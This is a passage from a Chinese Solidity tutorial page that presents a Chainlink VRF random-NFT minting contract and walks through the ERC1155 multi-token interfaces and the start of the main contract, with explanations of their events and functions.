class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// An example of a consumer contract that relies on a subscription for funding.<br>// It shows how to setup multiple execution paths for handling a response.<br>pragma solidity 0.8.21;<br>import &#123;ERC721&#125; from &quot;./34_ERC721.sol&quot;;<br>//import &#123;LinkTokenInterface&#125; from &quot;@chainlink/contracts/src/v0.8/shared/interfaces/LinkTokenInterface.sol&quot;;<br>//import &#123;VRFCoordinatorV2Interface&#125; from &quot;@chainlink/contracts/src/v0.8/vrf/interfaces/VRFCoordinatorV2Interface.sol&quot;;<br>//import &#123;VRFConsumerBaseV2&#125; from &quot;@chainlink/contracts/src/v0.8/vrf/VRFConsumerBaseV2.sol&quot;;<br>import &#123;VRFConsumerBaseV2Plus&#125; from &quot;@chainlink/contracts/src/v0.8/vrf/dev/VRFConsumerBaseV2Plus.sol&quot;;<br>import &#123;VRFV2PlusClient&#125; from &quot;@chainlink/contracts/src/v0.8/vrf/dev/libraries/VRFV2PlusClient.sol&quot;;<br><br>/**<br> * THIS IS AN EXAMPLE CONTRACT THAT USES HARDCODED VALUES FOR CLARITY.<br> * THIS IS AN EXAMPLE CONTRACT THAT USES UN-AUDITED CODE.<br> * DO NOT USE THIS CODE IN PRODUCTION.<br> */<br><br>contract Random is ERC721, VRFConsumerBaseV2Plus&#123;<br>    // NFT相关<br>    uint256 public totalSupply = 100; // 总供给<br>    uint256[100] public ids; // 用于计算可供mint的tokenId<br>    uint256 public mintCount; // 已mint数量<br><br>    // chainlink VRF参数<br><br>    //VRFCoordinatorV2Interface<br>//    VRFV2PlusClient COORDINATOR;<br><br>    /**<br>     * 使用chainlink VRF，构造函数需要继承 VRFConsumerBaseV2<br>     * 不同链参数填的不一样<br>     * 网络: Sepolia测试网<br>     * Chainlink VRF Coordinator 地址: 0x8103B0A8A00be2DDC778e6e7eaa21791Cd364625<br>     * LINK 代币地址: 0x01BE23585060835E02B77ef475b0Cc51aA1e0709<br>     * 30 gwei Key Hash: 0x474e34a077df58807dbe9c96d3c009b23b3c6d0cce433e59bbf5b34f823bc56c<br>     * Minimum Confirmations 最小确认块数 : 3 （数字大安全性高，一般填12）<br>     * callbackGasLimit gas限制 : 最大 2,500,000<br>     * Maximum Random Values 一次可以得到的随机数个数 : 最大 500<br>     */<br>//    address vrfCoordinator = 0x8103B0A8A00be2DDC778e6e7eaa21791Cd364625;<br>//    bytes32 keyHash = 0x474e34a077df58807dbe9c96d3c009b23b3c6d0cce433e59bbf5b34f823bc56c;<br>//    uint16 requestConfirmations = 3;<br>//    uint32 callbackGasLimit = 1_000_000;<br>//    uint32 numWords = 1;<br>    uint256 s_subscriptionId;<br>    address vrfCoordinator = 0x9DdfaCa8183c41ad55329BdeeD9F6A8d53168B1B;<br>    bytes32 s_keyHash = 0x787d74caea10b2b357790d5b5247c2f63d1d91572a9846f780606e4d953677ae;<br>    uint32 callbackGasLimit = 40000;<br>    uint16 requestConfirmations = 3;<br>    uint32 numWords =  1;<br>//    uint64 subId;<br>    uint256 subId;<br>//    uint256 s_subscriptionId;<br>    uint256 public requestId;<br><br>    // 记录VRF申请标识对应的mint地址<br>    mapping(uint256 =&gt; address) public requestToSender;<br><br>    constructor(uint256 s_subId)VRFConsumerBaseV2Plus(vrfCoordinator) ERC721(&quot;WTF Random&quot;, &quot;WTF&quot;)&#123;<br>//        COORDINATOR = VRFV2PlusClient(vrfCoordinator);<br>        subId = s_subId;<br>    &#125;<br><br>    /**<br>    * 输入uint256数字，返回一个可以mint的tokenId<br>    */<br>    function pickRandomUniqueId(uint256 random) private returns (uint256 tokenId) &#123;<br>        //先计算减法，再计算++, 关注(a++，++a)区别<br>        uint256 len = totalSupply - mintCount++; // 可mint数量<br>        require(len &gt; 0, &quot;mint close&quot;); // 所有tokenId被mint完了<br>        uint256 randomIndex = random % len; // 获取链上随机数<br><br>        //随机数取模，得到tokenId，作为数组下标，同时记录value为len-1，如果取模得到的值已存在，则tokenId取该数组下标的value<br>        tokenId = ids[randomIndex] != 0 ? ids[randomIndex] : randomIndex; // 获取tokenId<br>        ids[randomIndex] = ids[len - 1] == 0 ? len - 1 : ids[len - 1]; // 更新ids 列表<br>        ids[len - 1] = 0; // 删除最后一个元素，能返还gas<br>    &#125;<br><br>    /**<br>    * 链上伪随机数生成<br>    * keccak256(abi.encodePacked()中填上一些链上的全局变量/自定义变量<br>    * 返回时转换成uint256类型<br>    */<br>    function getRandomOnchain() public view returns(uint256)&#123;<br>        /*<br>         * 本例链上随机只依赖区块哈希，调用者地址，和区块时间，<br>         * 想提高随机性可以再增加一些属性比如nonce等，但是不能根本上解决安全问题<br>         */<br>        bytes32 randomBytes = keccak256(abi.encodePacked(blockhash(block.number-1), msg.sender, block.timestamp));<br>        return uint256(randomBytes);<br>    &#125;<br><br>    // 利用链上伪随机数铸造NFT<br>    function mintRandomOnchain() public &#123;<br>        uint256 _tokenId = pickRandomUniqueId(getRandomOnchain()); // 利用链上随机数生成tokenId<br>        _mint(msg.sender, _tokenId);<br>    &#125;<br><br>    /**<br>     * 调用VRF获取随机数，并mintNFT<br>     * 要调用requestRandomness()函数获取，消耗随机数的逻辑写在VRF的回调函数fulfillRandomness()中<br>     * 调用前，需要在Subscriptions中fund足够的Link<br>     */<br><br>    function mintRandomVRF() public &#123;<br><br>        // 调用requestRandomness获取随机数<br>        requestId = s_vrfCoordinator.requestRandomWords(VRFV2PlusClient.RandomWordsRequest(<br>            s_keyHash,<br>            subId,<br>            requestConfirmations,<br>            callbackGasLimit,<br>            numWords,<br>            VRFV2PlusClient._argsToBytes(VRFV2PlusClient.ExtraArgsV1(false))<br><br>        ));<br>        requestToSender[requestId] = msg.sender;<br>    &#125;<br><br>    /**<br>     * VRF的回调函数，由VRF Coordinator调用<br>     * 消耗随机数的逻辑写在本函数中^ (Relevant source part starts here and spans across multiple lines)<br>     */<br>    function fulfillRandomWords(uint256 requestId, uint256[] calldata s_randomWords) internal override&#123;<br>        address sender = requestToSender[requestId]; // 从requestToSender中获取minter用户地址<br>        uint256 tokenId = pickRandomUniqueId(s_randomWords[0]); // 利用VRF返回的随机数生成tokenId<br>        _mint(sender, tokenId);<br>    &#125;<br>//    function fulfillRandomWords(<br>//        uint256 requestId,<br>//        uint256[] memory randomWords<br>//    ) internal override &#123;<br>//        address sender = requestToSender[requestId];<br>//        uint256 tokenId =s_randomWords[0]<br>//        // You can return the value to the requester,<br>//        // but this example simply stores it.<br>//        s_requestIdToRandomWords[requestId] = randomWords;<br>//        _mint(sender, tokenId);<br>//<br>//    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="40-ERC1155"><a href="#40-ERC1155" class="headerlink" title="40. ERC1155"></a>40. ERC1155</h1><p>不论是<code>ERC20</code>还是<code>ERC721</code>标准，每个合约都对应一个独立的代币。假设我们要在以太坊上打造一个类似《魔兽世界》的大型游戏，这需要我们对每个装备都部署一个合约。上千种装备就要部署和管理上千个合约，这非常麻烦。因此，<a href="https://eips.ethereum.org/EIPS/eip-1155">以太坊EIP1155</a>提出了一个多代币标准<code>ERC1155</code>，允许一个合约包含多个同质化和非同质化代币。<code>ERC1155</code>在GameFi应用最多，Decentraland、Sandbox等知名链游都使用它。</p><p>简单来说，<code>ERC1155</code>与之前介绍的非同质化代币标准<a href="https://github.com/AmazingAng/WTF-Solidity/tree/main/34_ERC721">ERC721</a>类似：在<code>ERC721</code>中，每个代币都有一个<code>tokenId</code>作为唯一标识，每个<code>tokenId</code>只对应一个代币；而在<code>ERC1155</code>中，每一种代币都有一个<code>id</code>作为唯一标识，每个<code>id</code>对应一种代币。这样，代币种类就可以非同质的在同一个合约里管理了，并且每种代币都有一个网址<code>uri</code>来存储它的元数据，类似<code>ERC721</code>的<code>tokenURI</code>。下面是<code>ERC1155</code>的元数据接口合约</p><p>那么怎么区分<code>ERC1155</code>中的某类代币是同质化还是非同质化代币呢？其实很简单：如果某个<code>id</code>对应的代币总量为<code>1</code>，那么它就是非同质化代币，类似<code>ERC721</code>；如果某个<code>id</code>对应的代币总量大于<code>1</code>，那么他就是同质化代币，因为这些代币都分享同一个<code>id</code>，类似<code>ERC20</code>。</p><h2 id="IERC1155接口合约"><a href="#IERC1155接口合约" class="headerlink" title="IERC1155接口合约"></a><code>IERC1155</code>接口合约</h2><p><code>IERC1155</code>接口合约抽象了<code>EIP1155</code>需要实现的功能，其中包含<code>4</code>个事件和<code>6</code>个函数。与<code>ERC721</code>不同，因为<code>ERC1155</code>包含多类代币，它实现了批量转账和批量余额查询，一次操作多种代币</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;./34_IERC165.sol&quot;;<br><br>/**<br> * @dev ERC1155标准的接口合约，实现了EIP1155的功能<br> * 详见：https://eips.ethereum.org/EIPS/eip-1155[EIP].<br> */<br>interface IERC1155 is IERC165 &#123;<br>    /**<br>     * @dev 单类代币转账事件<br>     * 当`value`个`id`种类的代币被`operator`从`from`转账到`to`时释放.<br>     */<br>    event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value);<br><br>    /**<br>     * @dev 批量代币转账事件<br>     * ids和values为转账的代币种类和数量数组<br>     */<br>    event TransferBatch(<br>        address indexed operator,<br>        address indexed from,<br>        address indexed to,<br>        uint256[] ids,<br>        uint256[] values<br>    );<br><br>    /**<br>     * @dev 批量授权事件<br>     * 当`account`将所有代币授权给`operator`时释放<br>     */<br>    event ApprovalForAll(address indexed account, address indexed operator, bool approved);<br><br>    /**<br>     * @dev 当`id`种类的代币的URI发生变化时释放，`value`为新的URI<br>     */<br>    event URI(string value, uint256 indexed id);<br><br>    /**<br>     * @dev 持仓查询，返回`account`拥有的`id`种类的代币的持仓量<br>     */<br>    function balanceOf(address account, uint256 id) external view returns (uint256);<br><br>    /**<br>     * @dev 批量持仓查询，`accounts`和`ids`数组的长度要想等。<br>     */<br>    function balanceOfBatch(address[] calldata accounts, uint256[] calldata ids)<br>    external<br>    view<br>    returns (uint256[] memory);<br><br>    /**<br>     * @dev 批量授权，将调用者的代币授权给`operator`地址。<br>     * 释放&#123;ApprovalForAll&#125;事件.<br>     */<br>    function setApprovalForAll(address operator, bool approved) external;<br><br>    /**<br>     * @dev 批量授权查询，如果授权地址`operator`被`account`授权，则返回`true`<br>     * 见 &#123;setApprovalForAll&#125;函数.<br>     */<br>    function isApprovedForAll(address account, address operator) external view returns (bool);<br><br>    /**<br>     * @dev 安全转账，将`amount`单位`id`种类的代币从`from`转账给`to`.<br>     * 释放&#123;TransferSingle&#125;事件.<br>     * 要求:<br>     * - 如果调用者不是`from`地址而是授权地址，则需要得到`from`的授权<br>     * - `from`地址必须有足够的持仓<br>     * - 如果接收方是合约，需要实现`IERC1155Receiver`的`onERC1155Received`方法，并返回相应的值<br>     */<br>    function safeTransferFrom(<br>        address from,<br>        address to,<br>        uint256 id,<br>        uint256 amount,<br>        bytes calldata data<br>    ) external;<br><br>    /**<br>     * @dev 批量安全转账<br>     * 释放&#123;TransferBatch&#125;事件<br>     * 要求：<br>     * - `ids`和`amounts`长度相等<br>     * - 如果接收方是合约，需要实现`IERC1155Receiver`的`onERC1155BatchReceived`方法，并返回相应的值<br>     */<br>    function safeBatchTransferFrom(<br>        address from,<br>        address to,<br>        uint256[] calldata ids,<br>        uint256[] calldata amounts,<br>        bytes calldata data<br>    ) external;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IERC1155事件"><a href="#IERC1155事件" class="headerlink" title="IERC1155事件"></a><code>IERC1155</code>事件</h3><ul><li><code>TransferSingle</code>事件：单类代币转账事件，在单币种转账时释放。</li><li><code>TransferBatch</code>事件：批量代币转账事件，在多币种转账时释放。</li><li><code>ApprovalForAll</code>事件：批量授权事件，在批量授权时释放。</li><li><code>URI</code>事件：元数据地址变更事件，在<code>uri</code>变化时释放。</li></ul><h3 id="IERC1155函数"><a href="#IERC1155函数" class="headerlink" title="IERC1155函数"></a><code>IERC1155</code>函数</h3><ul><li><code>balanceOf()</code>：单币种余额查询，返回<code>account</code>拥有的<code>id</code>种类的代币的持仓量。</li><li><code>balanceOfBatch()</code>：多币种余额查询，查询的地址<code>accounts</code>数组和代币种类<code>ids</code>数组的长度要相等。</li><li><code>setApprovalForAll()</code>：批量授权，将调用者的代币授权给<code>operator</code>地址。。</li><li><code>isApprovedForAll()</code>：查询批量授权信息，如果授权地址<code>operator</code>被<code>account</code>授权，则返回<code>true</code>。</li><li><code>safeTransferFrom()</code>：安全单币转账，将<code>amount</code>单位<code>id</code>种类的代币从<code>from</code>地址转账给<code>to</code>地址。如果<code>to</code>地址是合约，则会验证是否实现了<code>onERC1155Received()</code>接收函数。</li><li><code>safeBatchTransferFrom()</code>：安全多币转账，与单币转账类似，只不过转账数量<code>amounts</code>和代币种类<code>ids</code>变为数组，且长度相等。如果<code>to</code>地址是合约，则会验证是否实现了<code>onERC1155BatchReceived()</code>接收函数。</li></ul><h2 id="ERC1155接收合约"><a href="#ERC1155接收合约" class="headerlink" title="ERC1155接收合约"></a><code>ERC1155</code>接收合约</h2><p>与<code>ERC721</code>标准类似，为了避免代币被转入黑洞合约，<code>ERC1155</code>要求代币接收合约继承<code>IERC1155Receiver</code>并实现两个接收函数：</p><ul><li><code>onERC1155Received()</code>：单币转账接收函数，接受ERC1155安全转账<code>safeTransferFrom</code> 需要实现并返回自己的选择器<code>0xf23a6e61</code>。</li><li><code>onERC1155BatchReceived()</code>：多币转账接收函数，接受ERC1155安全多币转账<code>safeBatchTransferFrom</code> 需要实现并返回自己的选择器<code>0xbc197c81</code>。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;https://github.com/AmazingAng/WTF-Solidity/blob/main/34_ERC721/IERC165.sol&quot;;<br><br>/**<br> * @dev ERC1155接收合约，要接受ERC1155的安全转账，需要实现这个合约<br> */<br>interface IERC1155Receiver is IERC165 &#123;<br>    /**<br>     * @dev 接受ERC1155安全转账`safeTransferFrom` <br>     * 需要返回 0xf23a6e61 或 `bytes4(keccak256(&quot;onERC1155Received(address,address,uint256,uint256,bytes)&quot;))`<br>     */<br>    function onERC1155Received(<br>        address operator,<br>        address from,<br>        uint256 id,<br>        uint256 value,<br>        bytes calldata data<br>    ) external returns (bytes4);<br><br>    /**<br>     * @dev 接受ERC1155批量安全转账`safeBatchTransferFrom` <br>     * 需要返回 0xbc197c81 或 `bytes4(keccak256(&quot;onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)&quot;))`<br>     */<br>    function onERC1155BatchReceived(<br>        address operator,<br>        address from,<br>        uint256[] calldata ids,<br>        uint256[] calldata values,<br>        bytes calldata data<br>    ) external returns (bytes4);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ERC1155主合约"><a href="#ERC1155主合约" class="headerlink" title="ERC1155主合约"></a><code>ERC1155</code>主合约</h2><p><code>ERC1155</code>主合约实现了<code>IERC1155</code>接口合约规定的函数，还有单币&#x2F;多币的铸造和销毁函数。</p><h3 id="ERC1155变量"><a href="#ERC1155变量" class="headerlink" title="ERC1155变量"></a><code>ERC1155</code>变量</h3><p><code>ERC1155</code>主合约包含<code>4</code>个状态变量：</p><ul><li><code>name</code>：代币名称</li><li><code>symbol</code>：代币代号</li><li><code>_balances</code>：代币持仓映射，记录代币种类<code>id</code>下某地址<code>account</code>的持仓量<code>balances</code>。</li><li><code>_operatorApprovals</code>：批量授权映射，记录持有地址给另一个地址的授权情况。</li></ul><h3 id="ERC1155函数"><a href="#ERC1155函数" class="headerlink" title="ERC1155函数"></a><code>ERC1155</code>函数</h3><p><code>ERC1155</code>主合约包含<code>16</code>个函数：</p><ul><li>构造函数：初始化状态变量<code>name</code>和<code>symbol</code>。</li><li><code>supportsInterface()</code>：实现<code>ERC165</code>标准，声明它支持的接口，供其他合约检查。</li><li><code>balanceOf()</code>：实现<code>IERC1155</code>的<code>balanceOf()</code>，查询持仓量。与<code>ERC721</code>标准不同，这里需要输入查询的持仓地址<code>account</code>以及币种<code>id</code>。</li><li><code>balanceOfBatch()</code>：实现<code>IERC1155</code>的<code>balanceOfBatch()</code>，批量查询持仓量。</li><li><code>setApprovalForAll()</code>：实现<code>IERC1155</code>的<code>setApprovalForAll()</code>，批量授权，释放<code>ApprovalForAll</code>事件。</li><li><code>isApprovedForAll()</code>：实现<code>IERC1155</code>的<code>isApprovedForAll()</code>，查询批量授权信息。</li><li><code>safeTransferFrom()</code>：实现<code>IERC1155</code>的<code>safeTransferFrom()</code>，单币种安全转账，释放<code>TransferSingle</code>事件。与<code>ERC721</code>不同，这里不仅需要填发出方<code>from</code>，接收方<code>to</code>，代币种类<code>id</code>，还需要填转账数额<code>amount</code>。</li><li><code>safeBatchTransferFrom()</code>：实现<code>IERC1155</code>的<code>safeBatchTransferFrom()</code>，多币种安全转账，释放<code>TransferBatch</code>事件。</li><li><code>_mint()</code>：单币种铸造函数。</li><li><code>_mintBatch()</code>：多币种铸造函数。</li><li><code>_burn()</code>：单币种销毁函数。</li><li><code>_burnBatch()</code>：多币种销毁函数。</li><li><code>_doSafeTransferAcceptanceCheck</code>：单币种转账的安全检查，被<code>safeTransferFrom()</code>调用，确保接收方为合约的情况下，实现了<code>onERC1155Received()</code>函数。</li><li><code>_doSafeBatchTransferAcceptanceCheck</code>：多币种转账的安全检查，，被<code>safeBatchTransferFrom</code>调用，确保接收方为合约的情况下，实现了<code>onERC1155BatchReceived()</code>函数。</li><li><code>uri()</code>：返回<code>ERC1155</code>的第<code>id</code>种代币存储元数据的网址，类似<code>ERC721</code>的<code>tokenURI</code>。</li><li><code>baseURI()</code>：返回<code>baseURI</code>，<code>uri</code>就是把<code>baseURI</code>和<code>id</code>拼接在一起，需要开发重写。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>import &quot;./40_ERC1155.sol&quot;;<br>import &quot;./40_IERC1155Receiver.sol&quot;;<br>import &quot;./40_IERC1155MetadataURI.sol&quot;;<br>//import &quot;https://github.com/AmazingAng/WTF-Solidity/blob/main/34_ERC721/Address.sol&quot;;<br>import &quot;./String.sol&quot;;<br>//import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;<br>import &quot;./Address.sol&quot;;<br><br>import &quot;./34_IERC165.sol&quot;;<br><br>/**<br> * @dev ERC1155多代币标准<br> * 见 https://eips.ethereum.org/EIPS/eip-1155<br> */<br>contract ERC1155 is IERC165, IERC1155, IERC1155MetadataURI &#123;<br>    using Address for address; // 使用Address库，用isContract来判断地址是否为合约<br>    using Strings for uint256; // 使用Strings库<br>    // Token名称<br>    string public name;<br>    // Token代号<br>    string public symbol;<br>    // 代币种类id 到 账户account 到 余额balances 的映射<br>    mapping(uint256 =&gt; mapping(address =&gt; uint256)) private _balances;<br>    // address 到 授权地址 的批量授权映射<br>    mapping(address =&gt; mapping(address =&gt; bool)) private _operatorApprovals;<br>//    address test=0x11111;<br>    /**<br>     * 构造函数，初始化`name` 和`symbol`, uri_<br>     */<br>    constructor(string memory name_, string memory symbol_) &#123;<br>        name = name_;<br>        symbol = symbol_;<br>    &#125;<br><br>    /**<br>     * @dev See &#123;IERC165-supportsInterface&#125;.<br>     */<br>    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) &#123;<br>        return<br>            interfaceId == type(IERC1155).interfaceId ||<br>            interfaceId == type(IERC1155MetadataURI).interfaceId ||<br>            interfaceId == type(IERC165).interfaceId;<br>    &#125;<br><br>    /**<br>     * @dev 持仓查询 